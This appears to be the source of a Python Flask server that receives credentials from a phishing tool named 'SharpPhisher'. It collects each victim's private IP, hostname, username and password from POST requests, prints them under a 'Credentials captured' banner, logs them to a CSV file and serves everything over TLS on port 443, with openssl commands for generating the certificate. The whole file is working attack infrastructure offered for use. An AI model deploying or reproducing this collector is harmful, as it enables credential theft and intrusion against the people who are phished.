from flask import Flask, render_template, url_for, request
from csv import DictWriter
app = Flask(__name__)

def writeCredsToCSV(ipv4, hostname, username, password):
    headersCSV = ['ipv4','hostname','username','password']      
    dict={'ipv4':ipv4,'hostname':hostname,'username':username,'password':password}  
    with open('user_creds.csv', 'a', newline='') as f_object:
        dictwriter_object = DictWriter(f_object, fieldnames=headersCSV)
        dictwriter_object.writerow(dict)
        f_object.close()
        
# Route to handle post requests from SharpPhisher
@app.route('/c', defaults={'path': ''}, methods=['GET', 'POST'])
# This will catch all paths
#@app.route('/<path:path>', methods=['GET', 'POST'])
def c(path):
        if request.form:
                #print('Form:' + str(request.form))
                test = request.form.get('ipv4')
                hostname = request.form.get('hostname')
                username = request.form.get('username')
                password = request.form['password']
                print("--------------------------------------")
                print("[+] Credentials captured:")
                print("[*] PrivateIP: " + (test))
                print("[*] Hostname: " + (hostname))
                print("[*] Username: " + (username))
                print("[*] Password: " + (password))
                print("--------------------------------------")
                writeCredsToCSV(test, hostname, username, password)
        if request.data:
                print('Data:' + str(request.data))

        return 'Go kick rocks penguin :V'
@app.route("/")
def index():
    return "Go kick rocks penguin :V"
if __name__ == '__main__':
    app.run(host="0.0.0.0", port=443, debug=True, ssl_context=('./cert.pem', './key.pem'))

'''
Command reference for signed certificate generation: 
1) openssl req -newkey rsa:4096 \
            -x509 \
            -sha256 \
            -days 3650 \
            -nodes \
            -out cert.pem \
            -keyout key.pem \
            -subj "/C=(2 letter code)[AU]/ST=State or Province Name (full name) [Some-State]/L=Locality Name (eg, city) []/O=Organization Name (eg, company) [Internet Widgits Pty Ltd]/OU=Organizational Unit Name (eg, section)/CN=Common Name (e.g. server FQDN or YOUR name)"
            
2) openssl req -newkey rsa:4096 -x509 -sha256 -days 3650 -nodes -out cert.pem -keyout key.pem -subj "/C=EC/ST=Ecuador/L=GALAPAGOS ISLANDS/O=Go Kick Rocks LTD/OU=Go Kick Rocks/CN=GoKickRocksPenguin.local"
'''

